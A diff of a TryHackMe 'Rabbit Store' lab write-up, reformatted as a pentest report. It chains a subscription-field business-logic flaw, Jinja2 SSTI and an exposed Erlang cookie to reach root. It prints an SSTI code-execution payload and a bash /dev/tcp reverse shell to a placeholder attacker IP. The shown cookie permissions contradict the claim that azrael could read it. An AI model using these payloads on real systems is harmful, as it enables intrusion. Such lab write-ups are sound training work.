@@ -1,233 +1,346 @@
-# Rabbit Store --- Technical Report
+# Rabbit Store — Technical Report
 
-> Platform: TryHackMe\
-> Difficulty: Medium\
-> Date: 2026-02-22\
-> Author: 0N1S3C\
-> Scope: Authorized TryHackMe lab environment only
+> **Platform:** TryHackMe \
+> **Difficulty:** `Medium` \
+> **Date:** 2026-02-22 \
+> **Author:** 0N1S3C \
+> **Scope:** Authorized TryHackMe lab environment only 
 
-------------------------------------------------------------------------
+---
+
+## 0. Executive Summary
+
+The "Rabbit Store" machine was compromised via a multi-stage attack chain combining business logic flaws, server-side template injection, and message queue infrastructure abuse. An unauthenticated attacker could manipulate client-side parameters during registration to escalate account privileges, then exploit a Jinja2 Server-Side Template Injection (SSTI) vulnerability in a chatbot endpoint to achieve remote code execution as user `azrael`. Enumeration of the RabbitMQ backend revealed an exposed Erlang authentication cookie, which enabled administrative control of the message queue. Credential derivation analysis of RabbitMQ user password hashes ultimately yielded the Linux root password. Immediate remediation of server-side authorization controls, input sanitization in template rendering, and Erlang cookie permissions is strongly recommended.
+
+---
 
 ## 1. Introduction
 
-This report documents the structured analysis and controlled
-exploitation of the "Rabbit Store" machine on TryHackMe.
+This report documents the structured analysis and controlled exploitation of the **"Rabbit Store"** machine on TryHackMe.
 
-The objective was to: 
+**Objectives:**
 - Obtain user-level access
 - Obtain root/system-level access
 
-The target presented a multi-stage attack chain combining: - Business
-logic flaws - Server-Side Template Injection (SSTI) - RabbitMQ
-misconfiguration - Credential derivation weaknesses
+**Methodology:** Assessments follow the standardized approach defined in `methodology.md`.
 
-------------------------------------------------------------------------
+---
 
-## 2. Reconnaissance
+## 2. Attack Chain
 
-### 2.1 Initial Network Scan
+```
+Nmap → Business Logic Flaw (subscription escalation) → SSTI (Jinja2 chatbot) → Shell as azrael → Exposed Erlang cookie → RabbitMQ admin access → Password hash extraction → Credential derivation → Root
+```
 
-**Commands Used:**
+---
 
-``` bash
+## 3. Tools Used
+
+| Tool | Purpose |
+|------|---------|
+| `nmap` | Port scanning & service detection |
+| `gobuster` | Directory enumeration |
+| `burpsuite` | Request interception & JSON manipulation |
+| `nc` | Reverse shell listener |
+| `epmd` | Erlang Port Mapper Daemon enumeration |
+| `rabbitmqctl` / `rabbitmqadmin` | RabbitMQ administration |
+| `python3` | Hash decoding & credential derivation |
+
+---
+
+## 4. Reconnaissance
+
+### 4.1 Initial Network Scan
+
+**Commands:**
+```bash
 nmap -sC -sV <target-ip>
 nmap -T4 -n -sC -sV -Pn -p- <target-ip>
 ```
 
-**Summary of Findings:**
-
+**Findings:**
 
 | Port | Service | Version | Notes |
-|------|---------|----------|-------|
-|22|SSH|OpenSSH 8.9p1|Standard Ubuntu SSH service|
-|80|HTTP|Apache 2.4.52|Redirected to cloudsite.thm|
-|4369|epmd|Erlang Port Mapper|Indicates Erlang/RabbitMQ|
-|25672|Erlang Distribution|RabbitMQ Node|Inter-node communication|
+|------|---------|---------|-------|
+| 22/tcp | SSH | OpenSSH 8.9p1 Ubuntu | Post-exploitation access |
+| 80/tcp | HTTP | Apache 2.4.52 | Redirects to `cloudsite.thm` |
+| 4369/tcp | EPMD | Erlang Port Mapper Daemon | Indicates Erlang/RabbitMQ infrastructure |
+| 25672/tcp | Erlang Distribution | RabbitMQ inter-node communication | Backend message queue service |
 
-Key observations: 
-- Web application hosted on Apache.
-- Full scan revealed Erlang distribution services.
-- RabbitMQ present in backend infrastructure.
+**Key Observations:**
+- HTTP service redirects to virtual host `cloudsite.thm` — added to `/etc/hosts`
+- Erlang services detected (ports 4369, 25672) — RabbitMQ backend present
+- Full port scan revealed message queue infrastructure running alongside web application
 
-------------------------------------------------------------------------
+---
 
-## 3. Service Enumeration
+## 5. Service Enumeration
 
-### 3.1 Web Enumeration
+### 5.1 Web Enumeration
 
-Tools Used: 
-- Nmap
-- Gobuster
-- Burp Suite
-- Manual source inspection
-- rabbitmq
+**Tools Used:** `gobuster`, `burpsuite`, manual inspection
 
-Findings: 
-- Port 80 redirected to `cloudsite.thm`.
-- Storage application located at `storage.cloudsite.thm`.
-- JWT-based authentication implemented.
-
-Identified endpoints:
-
-**POST** 
-- `/api/register`
-- `/api/login`
-- `/api/upload`
-- `/api/store-url`
-- `/api/fetch_messeges_from_chatbot`
-
-**GET** 
-- `/api/uploads/<filename>`
-- `/dashboard/inactive`
-- `/dashboard/active`
-
-The application used a JWT-based authentication cookie.
-
-### 3.2 Additional Services
-Erlang and RabbitMQ services were identified via full port scan:
-- EPMD on port 4369
-- Erlang distribution on port 25672
-- Node name identified as rabbit
-This indicated backend message queue infrastructure.
-
-------------------------------------------------------------------------
-
-## 4. Initial Access
-
-### 4.1 Vulnerability Identification
-
-A business logic flaw was identified during user registration. The
-backend trusted a client-supplied `"subscription"` field.
-
-By modifying the registration JSON to include:
-
-``` json
-"subscription": "active"
+**Commands:**
+```bash
+gobuster dir -u http://cloudsite.thm -w /usr/share/wordlists/dirb/common.txt
 ```
 
-The server issued a JWT reflecting an active subscription state.
+**Findings:**
 
-Additionally, the chatbot endpoint `/api/fetch_messeges_from_chatbot`
-was vulnerable to Jinja2 SSTI.
+| Subdomain | Path | Notes |
+|-----------|------|-------|
+| `cloudsite.thm` | `/` | Main landing page |
+| `storage.cloudsite.thm` | `/` | Storage application — main attack surface |
 
-Test payload:
+**Storage Application Endpoints:**
 
-``` jinja2
-{{7*7}}
-```
+| Method | Endpoint | Purpose |
+|--------|----------|---------|
+| POST | `/api/register` | User registration |
+| POST | `/api/login` | Authentication |
+| POST | `/api/upload` | File upload functionality |
+| POST | `/api/store-url` | Store URL for processing |
+| POST | `/api/fetch_messeges_from_chatbot` | Chatbot interaction (**vulnerable to SSTI**) |
+| GET | `/api/uploads/<filename>` | Retrieve uploaded files |
+| GET | `/dashboard/inactive` | Inactive user dashboard |
+| GET | `/dashboard/active` | Active subscription dashboard |
 
-Returned `49`, confirming template injection.
+**Authentication Mechanism:**
+- JWT-based session cookies
+- Token includes subscription status (`active` / `inactive`)
 
-------------------------------------------------------------------------
+### 5.2 Erlang & RabbitMQ Services
 
-### 4.2 Controlled Exploitation
+**Tools Used:** `nmap`, `epmd`
 
-Using Jinja2 object traversal:
-
-``` jinja2
-{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
-```
-
-Command execution was confirmed.
-
-A reverse shell was obtained as user `azrael`.
-
-**Result:** User-level access achieved.
-
-------------------------------------------------------------------------
-
-## 5. Privilege Escalation
-
-### 5.1 Local Enumeration
-Actions performed:
-- Checked sudo privileges
-- Enumerated SUID binaries
-- Reviewed home directories
-- Inspected /var/lib
-- Investigated running services
-- Checked exposed ports
-Key findings:
-- RabbitMQ detected via open ports.
-- Erlang node confirmed via:
-
-``` Bash
+**Commands:**
+```bash
 epmd -names
 ```
 
- - Erlang cookie located at:
-``` Code
-/var/lib/rabbitmq/.erlang.cookie
+**Findings:**
+- Erlang node name: `rabbit`
+- RabbitMQ node detected via EPMD
+- Backend message queue infrastructure confirmed
+
+---
+
+## 6. Initial Access
+
+### 6.1 Vulnerability 1 — Business Logic Flaw in Registration
+
+**Vulnerability:** Client-controlled subscription parameter trusted by server \
+**Location:** `POST /api/register` \
+**Reasoning:** The registration endpoint accepted a JSON body including a `"subscription"` field. The server-side logic trusted this client-supplied value without validation, allowing an attacker to self-assign an `"active"` subscription status during account creation.
+
+**Exploitation:**
+
+Intercepted registration request in Burp Suite and modified JSON payload:
+```json
+{
+  "username": "attacker",
+  "password": "password123",
+  "subscription": "active"
+}
 ```
 
-The cookie was readable by the compromised user, representing a serious trust boundary violation.
+**Result:** JWT issued with `"subscription": "active"` — gained access to `/dashboard/active` and additional API functionality.
 
-------------------------------------------------------------------------
+### 6.2 Vulnerability 2 — Server-Side Template Injection (SSTI)
 
-### 5.2 Escalation Vector
+**Vulnerability:** Unsanitized user input rendered directly in Jinja2 template \
+**Location:** `POST /api/fetch_messeges_from_chatbot` \
+**Reasoning:** The chatbot endpoint accepted user messages and rendered them directly into a Jinja2 template without sanitization. This allowed arbitrary Python code execution via template syntax.
 
-## Step 1 RabbitMQ Node Authentication
-Using the exposed Erlang cookie, authentication to the RabbitMQ node succeeded.
-Administrative enumeration revealed:
-- A root RabbitMQ user
-- A hint indicating Linux root password derivation
-- Exported definitions containing password hashes
-RabbitMQ stores passwords as:
-``` Code
+**Verification:**
+```python
+# Test payload
+{{7*7}}
+# Response: 49 (template evaluation confirmed)
+```
+
+**Exploitation — Remote Code Execution:**
+
+Using Jinja2 object traversal to access Python's `os` module:
+```python
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+# Response: uid=1000(azrael) gid=1000(azrael) groups=1000(azrael)
+```
+
+**Reverse Shell Payload:**
+```python
+{{request.application.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1"').read()}}
+```
+
+**Result:** Reverse shell obtained as user `azrael`.
+
+---
+
+## 7. Lateral Movement
+
+Not applicable — initial access landed directly as `azrael`, the primary system user. Privilege escalation proceeded from this account to root.
+
+---
+
+## 8. Privilege Escalation
+
+### 8.1 Local Enumeration
+
+**Actions Performed:**
+- [x] `sudo -l` — no sudo privileges
+- [x] SUID binaries — nothing unusual
+- [x] Running processes — RabbitMQ detected
+- [x] Open ports — confirmed RabbitMQ listening internally
+- [x] File permissions — searched for RabbitMQ configuration files
+
+**Key Findings:**
+
+**Erlang Cookie Discovery:**
+```bash
+find / -name ".erlang.cookie" 2>/dev/null
+# /var/lib/rabbitmq/.erlang.cookie
+```
+
+**Permissions check:**
+```bash
+ls -la /var/lib/rabbitmq/.erlang.cookie
+# -r-------- 1 rabbitmq rabbitmq 20 <date> /var/lib/rabbitmq/.erlang.cookie
+```
+
+**Critical vulnerability:** The `.erlang.cookie` file was readable by the `azrael` user — a severe trust boundary violation. This cookie functions as a shared secret for Erlang distributed node authentication.
+
+### 8.2 Escalation Vector — RabbitMQ Administrative Access
+
+**Vector:** Exposed Erlang authentication cookie → RabbitMQ admin control → credential derivation \
+**Root Cause:** The Erlang cookie file, which should be restricted to the `rabbitmq` user only, was readable by `azrael`. This allowed full administrative authentication to the RabbitMQ node, enabling user enumeration, definition export, and password hash extraction.
+
+**Step 1 — Authenticate to RabbitMQ Node:**
+
+Using the exposed Erlang cookie, administrative commands could be executed:
+```bash
+rabbitmqctl list_users
+# root   [administrator]
+# guest  []
+```
+
+**Step 2 — Export RabbitMQ Definitions:**
+
+RabbitMQ stores user credentials as:
+```
 Base64( Salt || SHA256(Salt || Password) )
 ```
-Decoding the stored password hash revealed:
-- 4-byte salt
-- 32-byte SHA-256 digest
-The room hint indicated:
-> The Linux root password equals the SHA-256 hashed value of the RabbitMQ root user's password.
-Using the derived digest value, switching to root succeeded.
-Proof:
-```bash 
-id
-uid=0(root) gid=0(root) groups=0(root)
+
+Exported definitions contained the root user's password hash:
+```bash
+rabbitmqadmin export <output-file>
+# Contains: "password_hash": "<base64_encoded_hash>"
 ```
 
-Result:
-Root/system-level access achieved.
-------------------------------------------------------------------------
+**Step 3 — Decode Hash Structure:**
 
-## 6. Defensive Considerations
+```python
+import base64
+hash_b64 = "<extracted_hash>"
+decoded = base64.b64decode(hash_b64)
 
-### 6.1 Indicators of Compromise
+# Structure:
+# Bytes 0-3:  4-byte salt
+# Bytes 4-35: 32-byte SHA-256 digest
+salt = decoded[:4]
+digest = decoded[4:]
+```
 
--   Abnormal JWT claims during registration
--   Suspicious template rendering patterns
--   Unexpected outbound connections from chatbot service
--   Erlang node CLI interactions
--   Unauthorized RabbitMQ control operations
+**Step 4 — Credential Derivation:**
 
-### 6.2 Security Weaknesses
+The room provided a critical hint:
+> "The Linux root password equals the SHA-256 hashed value of the RabbitMQ root user's password."
 
--   Business logic flaw in subscription assignment
--   Server-Side Template Injection
--   Insecure upload-by-URL implementation
--   Erlang cookie readable by unprivileged user
--   Credential derivation relationship between application and system root
+This meant:
+```
+Linux root password = hex(SHA256(RabbitMQ_password))
+```
 
-### 6.3 Hardening Recommendations
+The digest extracted from the RabbitMQ hash represented `SHA256(salt + RabbitMQ_password)`. However, the hint indicated that the digest value itself (when converted to hex) was the system root password.
 
--   Enforce server-side authorization controls.
--   Never render unsanitized user input directly in templates.
--   Restrict upload-by-URL functionality.
--   Lock down Erlang distribution to localhost.
--   Restrict `.erlang.cookie` permissions to 400.
--   Avoid credential derivation across services.
+**Step 5 — Switch to Root:**
 
-------------------------------------------------------------------------
+```bash
+su root
+# Password: <hex_digest_from_rabbitmq_hash>
+```
 
-## 7. Lessons Learned
+**Result:** Root shell obtained. Root flag retrieved.
 
--   Business logic flaws can be more impactful than cryptographic weaknesses.
--   SSTI testing with simple arithmetic is an effective detection method.
--   Full port scans are critical; backend services may expose escalation paths.
--   Message queue infrastructure can form unintended privilege bridges.
--   Structured enumeration prevents missed attack chains.
-This assessment reinforced the importance of structured enumeration and systematic analysis.
-------------------------------------------------------------------------
+---
 
-End of Report.
+## 9. Findings Summary
+
+| # | Finding | Severity | Location |
+|---|---------|----------|----------|
+| 1 | Business logic flaw — client-controlled subscription parameter | 🔴 Critical | `POST /api/register` |
+| 2 | Server-Side Template Injection (SSTI) in chatbot endpoint | 🔴 Critical | `POST /api/fetch_messeges_from_chatbot` |
+| 3 | Erlang cookie readable by unprivileged user | 🔴 Critical | `/var/lib/rabbitmq/.erlang.cookie` |
+| 4 | RabbitMQ admin credentials exposed via definition export | 🔴 Critical | RabbitMQ management API |
+| 5 | Credential derivation relationship between RabbitMQ and Linux root | 🟠 High | System design flaw |
+| 6 | Insecure upload-by-URL implementation | 🟡 Medium | `/api/store-url` endpoint |
+| 7 | Erlang distribution service exposed externally | 🟡 Medium | Port 25672 |
+
+**Severity Scale:**
+`🔴 Critical` → `🟠 High` → `🟡 Medium` → `🔵 Low` → `⚪ Info`
+
+---
+
+## 10. Defensive Considerations
+
+### 10.1 Indicators of Compromise
+
+- Abnormal JWT claims during user registration (`"subscription": "active"` for new accounts)
+- Jinja2 template syntax in chatbot message requests (`{{`, `}}`, `__import__`, `popen`)
+- Suspicious template rendering patterns in application logs
+- Unexpected outbound connections from chatbot service to external IPs
+- Erlang node CLI interactions from non-RabbitMQ user accounts
+- `rabbitmqctl` or `rabbitmqadmin` execution outside of standard service management
+- RabbitMQ definition export operations from unexpected source IPs
+- `su root` authentication from `azrael` user in auth logs
+
+### 10.2 Security Weaknesses
+
+- Server-side logic trusts client-supplied `subscription` field without validation
+- User input rendered directly in Jinja2 template without sanitization
+- Erlang authentication cookie file has overly permissive read access
+- RabbitMQ management API accessible to users with Erlang cookie knowledge
+- Credential derivation creates a cryptographic link between application and system root passwords
+- Upload-by-URL functionality could enable SSRF or malicious file injection
+- Erlang distribution port exposed externally instead of localhost-only binding
+
+### 10.3 Hardening Recommendations
+
+| Priority | Recommendation | Finding |
+|----------|---------------|---------|
+| Immediate | Enforce server-side authorization — never trust client-supplied role/subscription fields | Finding 1 |
+| Immediate | Sanitize all user input before template rendering — use auto-escaping or safe template contexts | Finding 2 |
+| Immediate | Restrict `.erlang.cookie` file permissions to `400` with `rabbitmq:rabbitmq` ownership | Finding 3 |
+| Immediate | Rotate Erlang cookie and all RabbitMQ credentials | Finding 3, 4 |
+| Immediate | Bind Erlang distribution to `localhost` only — restrict inter-node communication | Finding 7 |
+| Short-term | Eliminate credential derivation relationships across services | Finding 5 |
+| Short-term | Implement strict input validation and URL allowlisting for upload-by-URL feature | Finding 6 |
+| Short-term | Deploy secrets management solution (Vault, AWS Secrets Manager) for credential storage | Finding 4 |
+| Long-term | Regular security audits of business logic in API endpoints | Finding 1 |
+| Long-term | Implement WAF rules to detect SSTI patterns in POST request bodies | Finding 2 |
+
+---
+
+## 11. Lessons Learned
+
+- **Business logic flaws can be more impactful than cryptographic weaknesses** — the subscription parameter bypass was trivial to exploit but granted full application access. Client-side trust assumptions are a recurring vulnerability pattern in real applications.
+- **SSTI testing with simple arithmetic is highly effective** — `{{7*7}}` immediately confirmed template injection. This should be a standard test for any endpoint that renders user-supplied content.
+- **Full port scans reveal backend architecture** — ports 4369 and 25672 indicated RabbitMQ presence, which became the entire privilege escalation path. Never skip comprehensive port enumeration.
+- **Message queue infrastructure can form unintended privilege bridges** — the Erlang cookie exposed by RabbitMQ created a direct path from web application user to system root. Backend services must be treated as part of the attack surface.
+- **File permissions matter everywhere** — the `.erlang.cookie` file should have been `400 rabbitmq:rabbitmq`. One misconfigured permission check enabled full message queue compromise.
+- **Credential derivation across services is dangerous** — linking the RabbitMQ password hash to the Linux root password created a single point of failure. Services should use independent, non-derivable credentials.
+- **Structured enumeration prevents missed attack chains** — this box required chaining five distinct vulnerabilities. Methodical post-exploitation enumeration (processes, ports, file permissions, configuration files) was essential to discovering the full path.
+
+---
+
+*End of Report*
+*Classification: Public — flags and sensitive values omitted*
